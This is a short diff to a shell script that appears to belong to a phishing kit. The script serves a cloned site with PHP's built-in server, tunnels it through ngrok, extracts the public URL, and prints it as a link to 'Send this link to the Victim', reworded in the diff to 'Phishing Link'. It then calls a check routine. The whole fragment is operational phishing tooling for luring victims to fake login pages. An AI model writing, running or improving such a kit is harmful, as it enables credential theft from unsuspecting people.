@@ -46,11 +46,11 @@ fi
 printf "${green}Starting Personal Home Page (PHP)...${reset} \n"
 cd sites/$site && php -S 127.0.0.1:$port
 sleep 2
-printf "${green}Starting ngrok${reset} \n"
+printf "${green}Starting ngrok...${reset} \n"
 ./ngrok http $port
 sleep 10
 
 link=$( curl -S -n http://127.0.0.1:4040/api/tunnels | grep -oE "https:\/\/[a-z0-9\-]*\.ngrok\.io")
-printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link
-checkfound
+printf "${green}Phishing Link: \n" $link
+check
 }
